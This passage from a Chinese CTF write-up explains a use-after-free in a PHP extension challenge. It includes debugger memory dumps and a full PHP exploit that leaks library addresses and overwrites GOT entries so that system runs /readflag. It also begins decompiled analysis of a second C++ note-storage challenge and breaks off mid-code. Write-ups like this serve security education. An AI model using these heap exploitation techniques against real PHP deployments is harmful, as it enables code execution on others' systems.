<span class="number">5</span>, x, y) \</span><br><span class="line">    _(<span class="number">29</span>, <span class="number">3072</span>,    <span class="number">4</span>, <span class="number">3</span>, x, y)</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ZEND_ALLOC_SIZES_H */</span></span></span><br></pre></td></tr></table></figure><p>申请内存空间时，大小向上对齐。</p><p>而空闲chunk的维护，也是通过一个单链表，即chunk中存在一个fd指针，指向下一个空闲chunk，当链表中最后一个chunk被申请出去时，其fd=0，则说明空闲chunk已被用完，之后再申请会从新的page中产生。</p><p>同样地在释放的时候，并不是任意内存均可被<code>_efree</code>，这里仅根据调试结果来看，应该需要位于特定的page中。</p></li><li><p>因此根据上面的管理机制，注意到对于size处于225~256时，申请出的chunk大小都是256，但是不同的是，只有size=256时，才能不触发<code>_efree</code>，否则会被立刻<code>_efree</code>。</p></li><li><p>同时在调试过程中发现，在申请第一个0x100的chunk时，存在残留的地址信息，其中有一项指向php进程的heap区域，而该区域正好存在hackphp.so中的函数地址，因此只要利用uaf，申请到该区域的内存，就能实现leak，得到hackphp.so的基址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">gef➤  tele 0x00007fa5c088e000</span><br><span class="line">0x00007fa5c088e000│+0x0000: "aaaaaaaabbbbbbbbccccccccdddddddd"</span><br><span class="line">0x00007fa5c088e008│+0x0008: "bbbbbbbbccccccccdddddddd"</span><br><span class="line">0x00007fa5c088e010│+0x0010: "ccccccccdddddddd"</span><br><span class="line">0x00007fa5c088e018│+0x0018: "dddddddd"</span><br><span class="line">0x00007fa5c088e020│+0x0020: 0x000055b970154f00  →  0x000001c600000001  ==&gt; remained data</span><br><span class="line">0x00007fa5c088e028│+0x0028: 0x0000000000000006</span><br><span class="line">0x00007fa5c088e030│+0x0030: 0x00007fa5c0872200  →  0x0000004600000001</span><br><span class="line">0x00007fa5c088e038│+0x0038: 0x0000000000000006</span><br><span class="line">0x00007fa5c088e040│+0x0040: 0x000055b970155060  →  0x000001c600000001</span><br><span class="line">0x00007fa5c088e048│+0x0048: 0x0000000000000006</span><br><span class="line">gef➤  tele 0x000055b970154f00 50</span><br><span class="line">0x000055b970154f00│+0x0000: 0x000001c600000001</span><br><span class="line">0x000055b970154f08│+0x0008: 0xd304f972b2628589</span><br><span class="line">0x000055b970154f10│+0x0010: 0x000000000000000c</span><br><span class="line">0x000055b970154f18│+0x0018: "hackphp_edit"</span><br><span class="line">0x000055b970154f20│+0x0020: 0x0000000074696465 ("edit"?)</span><br><span class="line">0x000055b970154f28│+0x0028: 0x0000000000000081</span><br><span class="line">0x000055b970154f30│+0x0030: 0x0000000100000001</span><br><span class="line">0x000055b970154f38│+0x0038: 0x000055b970154f00  →  0x000001c600000001</span><br><span class="line">0x000055b970154f40│+0x0040: 0x0000000000000000</span><br><span class="line">0x000055b970154f48│+0x0048: 0x0000000000000000</span><br><span class="line">0x000055b970154f50│+0x0050: 0x0000000100000001</span><br><span class="line">0x000055b970154f58│+0x0058: 0x00007fa5c3073cb8  →  0x00007fa5c3072095  →  0x6c62757000727473 ("str"?)</span><br><span class="line">0x000055b970154f60│+0x0060: 0x00007fa5c3071480  →  &lt;zif_hackphp_edit+0&gt; endbr64   ==&gt; hackphp.so</span><br><span class="line">0x000055b970154f68│+0x0068: 0x000055b970154da0  →  0x013416b6000000a8</span><br><span class="line">0x000055b970154f70│+0x0070: 0x0000000000000000</span><br><span class="line">0x000055b970154f78│+0x0078: 0x0000000000000000</span><br><span class="line">0x000055b970154f80│+0x0080: 0x0000000000000000</span><br><span class="line">0x000055b970154f88│+0x0088: 0x0000000000000000</span><br><span class="line">0x000055b970154f90│+0x0090: 0x0000000000000000</span><br><span class="line">0x000055b970154f98│+0x0098: 0x0000000000000000</span><br><span class="line">0x000055b970154fa0│+0x00a0: 0x0000000000000000</span><br><span class="line">0x000055b970154fa8│+0x00a8: 0x0000000000000031 ("1"?)</span><br><span class="line">0x000055b970154fb0│+0x00b0: 0x000001c600000001</span><br><span class="line">0x000055b970154fb8│+0x00b8: 0xa82920e8d2d87056</span><br><span class="line">0x000055b970154fc0│+0x00c0: 0x000000000000000e</span><br><span class="line">0x000055b970154fc8│+0x00c8: "hackphp_delete"</span><br><span class="line">0x000055b970154fd0│+0x00d0: 0x00006574656c6564 ("delete"?)</span><br><span class="line">0x000055b970154fd8│+0x00d8: 0x0000000000000081</span><br><span class="line">0x000055b970154fe0│+0x00e0: 0x0000000100000001</span><br><span class="line">0x000055b970154fe8│+0x00e8: 0x000055b970154fb0  →  0x000001c600000001</span><br><span class="line">0x000055b970154ff0│+0x00f0: 0x0000000000000000</span><br><span class="line">0x000055b970154ff8│+0x00f8: 0x0000000000000000</span><br><span class="line">0x000055b970155000│+0x0100: 0x0000000000000000</span><br><span class="line">0x000055b970155008│+0x0108: 0x0000000000000000</span><br><span class="line">0x000055b970155010│+0x0110: 0x00007fa5c3071420  →  &lt;zif_hackphp_delete+0&gt; endbr64  ==&gt; hackphp.so</span><br><span class="line">0x000055b970155018│+0x0118: 0x000055b970154da0  →  0x013416b6000000a8</span><br><span class="line">0x000055b970155020│+0x0120: 0x0000000000000000</span><br><span class="line">0x000055b970155028│+0x0128: 0x0000000000000000</span><br><span class="line">0x000055b970155030│+0x0130: 0x0000000000000000</span><br><span class="line">0x000055b970155038│+0x0138: 0x0000000000000000</span><br><span class="line">0x000055b970155040│+0x0140: 0x0000000000000000</span><br><span class="line">0x000055b970155048│+0x0148: 0x0000000000000000</span><br><span class="line">0x000055b970155050│+0x0150: 0x0000000000000000</span><br><span class="line">0x000055b970155058│+0x0158: 0x0000000000000031 ("1"?)</span><br><span class="line">0x000055b970155060│+0x0160: 0x000001c600000001</span><br><span class="line">0x000055b970155068│+0x0168: 0xc0938b7014ebbf23</span><br><span class="line">0x000055b970155070│+0x0170: 0x000000000000000b</span><br><span class="line">0x000055b970155078│+0x0178: "hackphp_get"</span><br><span class="line">0x000055b970155080│+0x0180: 0x0000000000746567 ("get"?)</span><br><span class="line">0x000055b970155088│+0x0188: 0x0000000000000081</span><br></pre></td></tr></table></figure><p>这里发现调试的时候，残留的heap地址不是固定的，可能重启下就又换了个地址，但是并不影响后续利用，如果出现如上的情况只要<code>hackphp_edit</code>的时候多写一个字节，然后算地址的时候处理一下即可。</p></li><li><p>得到hackphp.so的基址，加上任意地址写，就能够完全控制全局变量<code>buf</code>；不过这里要注意一下，<code>_emalloc</code>到任意地址的时候，要注意该地址的fake chunk-&gt;fd要么指向可写地址，原因是打印的时候也会触发<code>_emalloc</code>；要么直接为0，这样下一次<code>_emalloc</code>就会重新分配新的page，不会破坏内存。</p></li><li><p>因此利用的思路为：</p><ul><li>首先正常<code>_emalloc(0x100)</code>，leak出php进程的heap地址。</li><li>之后通过uaf，申请到该heap中的内存，通过<code>zif_hackphp_get</code>得到hackphp.so的加载基址。</li><li>继续通过uaf，申请到全局变量buf所在的内存空间，覆盖buf指向<code>memcpy_got</code>。</li><li>通过<code>zif_hackphp_get</code>得到<code>memcpy</code>的地址，计算出libc基址和<code>system</code>的地址。</li><li>再通过<code>zif_hackphp_edit</code>覆盖<code>memcpy_got</code>处为<code>/readflag</code>，以及覆盖<code>_efree</code>为<code>system</code>。</li><li>最后调用<code>zif_hackphp_delete</code>触发<code>system</code>。</li></ul></li><li><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $hex = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = strlen($str) - <span class="number">1</span>;$i &gt;= <span class="number">0</span>;$i--) $hex.= dechex(ord($str[$i]));</span><br><span class="line">    $hex = strtoupper($hex);</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexToStr</span><span class="params">($hex)</span> </span>&#123;</span><br><span class="line">$hex = sprintf(<span class="string">"%08x"</span>, $hex);</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = strlen($hex) - <span class="number">2</span>;$i &gt;= <span class="number">0</span>;$i -= <span class="number">2</span>) $str.= chr(hexdec($hex[$i] . $hex[$i + <span class="number">1</span>]));</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $fp = fopen(<span class="string">'/dev/stdin'</span>, <span class="string">'r'</span>);</span><br><span class="line">    $input = fgets($fp, <span class="number">255</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    $input = chop($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">echo</span> read();</span><br><span class="line">hackphp_edit(<span class="string">"aaaaaaaabbbbbbbbccccccccdddddddd"</span>);</span><br><span class="line">$a = hackphp_get();</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> strlen($a);</span><br><span class="line">$heap_addr = substr($a, <span class="number">-6</span>);</span><br><span class="line"><span class="keyword">echo</span> $heap_addr.<span class="string">"\n"</span>;</span><br><span class="line">$heap_addrn = base_convert(strTohex($heap_addr),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> $heap_addrn;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">hackphp_create(<span class="number">0xff</span>);</span><br><span class="line">hackphp_edit(hexToStr($heap_addrn + <span class="number">0xf8</span>));</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">hackphp_edit(<span class="string">"aaaaaaaabbbbbbbbcccccccc"</span>);</span><br><span class="line"></span><br><span class="line">$edit_addr = substr(hackphp_get(), <span class="number">-6</span>);</span><br><span class="line">$edit_addrn = base_convert(strTohex($edit_addr),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">$buf_addrn = $edit_addrn - <span class="number">0x1420</span> + <span class="number">0x4178</span>;</span><br><span class="line"><span class="keyword">echo</span> $buf_addrn;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$buf_addr = hexToStr($buf_addrn<span class="number">-0x10</span>);</span><br><span class="line">$vline = $heap_addrn + <span class="number">0xC8090</span>;</span><br><span class="line">$memcpy_got = $edit_addrn<span class="number">-0x1420</span>+<span class="number">0x4060</span>;</span><br><span class="line"></span><br><span class="line">hackphp_create(<span class="number">0xff</span>);</span><br><span class="line">hackphp_edit($buf_addr);</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">hackphp_create(<span class="number">0x100</span>);</span><br><span class="line">$payload = <span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span>.hexToStr($vline).<span class="string">"\x00\x00"</span>.hexToStr($memcpy_got);</span><br><span class="line">hackphp_edit($payload);</span><br><span class="line">$libc = hackphp_get();</span><br><span class="line">$libcn = base_convert(strToHex($libc),<span class="number">16</span>,<span class="number">10</span>) - <span class="number">0x18e670</span>;</span><br><span class="line">$system_addr = $libcn + <span class="number">0x55410</span>; </span><br><span class="line"><span class="keyword">echo</span> $libcn;</span><br><span class="line">$pay = <span class="string">"/readflag\x00\x00\x00\x00\x00\x00\x00"</span>.chr($system_addr &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFF</span>).chr(($system_addr &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">hackphp_edit($pay);</span><br><span class="line">hackphp_delete();</span><br><span class="line"><span class="comment">// echo read();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>附上调试过程中踩到的坑：</p><ul><li><p>在调用<code>zif_hackphp_get</code>的时候，要保证此时内存状态是正常的，因为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_hackphp_get</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( buf &amp;&amp; buf_size )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = zend_strpprintf(<span class="number">0L</span>L, <span class="string">"%s"</span>, buf);</span><br><span class="line">    return_value-&gt;value.lval = v2;</span><br><span class="line">    return_value-&gt;u1.type_info = (*(_DWORD *)(v2 + <span class="number">4</span>) &amp; <span class="number">0x40</span>) == <span class="number">0</span> ? <span class="number">262</span> : <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    return_value-&gt;u1.type_info = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>zend_strpprintf</code>会调用到<code>_emalloc</code>申请临时buffer，之后用完会释放，若此时内存状态不正常，就会crash。</p></li><li><p>调试的时候可以手动实现一个<code>read</code>的功能，将php断住，便于下断点。至于<code>fopen</code>被禁用的问题，可以修改<code>php.ini</code>中的<code>disable_function</code>，把<code>fopen</code>给删掉即可。</p></li></ul></li></ol><h1 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h1><ol><li><p>首先分析一下几个重要的结构体，以及各个菜单的功能：</p><ul><li><p>NoteStorageImpl：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteStorageImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span> *<span class="title">member_1</span>;</span> <span class="comment">// offset = 0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span> *<span class="title">member_2</span>;</span> <span class="comment">// offset = 8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">NoteDBImpl</span> *<span class="title">house</span>;</span>  <span class="comment">// offset = 0x10</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>NoteImpl:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *func_get_encourage; <span class="comment">// offset = 0</span></span><br><span class="line">    <span class="keyword">uint8_t</span> vector_status;   <span class="comment">// offset = 8</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; buf_1;   <span class="comment">// offset = 0x10</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; buf_2;  <span class="comment">// offset = 0x1A0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *<span class="built_in">malloc</span>;  <span class="comment">// offset = 0x1B8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>NoteDBImpl</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteDBImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> status;       <span class="comment">// offset = 0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NoteImpl</span> *<span class="title">member</span>;</span> <span class="comment">// offset = 8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>editHouse：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::editHouse(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteImpl *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(<span class="keyword">this</span>) != <span class="number">1</span> )</span><br><span class="line">    v1 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="built_in">get</span>((__int64)<span class="keyword">this</span> + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="built_in">get</span>((__int64)<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> NoteImpl::add(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断<code>NoteStorageImpl</code>中的<code>member_1</code>是否为空，若不为空，则操作<code>member_1</code>，否则操作<code>member_2</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __fastcall NoteImpl::add(NoteImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)<span class="keyword">this</span> + <span class="number">8</span>) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Do you want to clear it?(y/N)"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="string">'y'</span> &amp;&amp; *((_BYTE *)<span class="keyword">this</span> + <span class="number">8</span>) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"you can only clear once!!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::clear((_QWORD *)<span class="keyword">this</span> + <span class="number">2</span>);</span><br><span class="line">      *((_BYTE *)<span class="keyword">this</span> + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"content(q to quit):"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_QWORD *)<span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::ios::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)v4 + *(_QWORD *)(*v4 - <span class="number">0x18</span>LL)) || v7 == <span class="string">'q'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::size((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">0x10</span>) &gt; <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"nonono!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::push_back((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>, &amp;v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体<code>NoteImpl</code>成员<code>buf_1</code>都有一次<code>clear</code>的机会，除此之外，只能通过<code>push_back</code>追加，总长度最多为0x1000。</p></li><li><p>saveHouse：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::saveHouse(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  NoteImpl *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="keyword">operator</span> <span 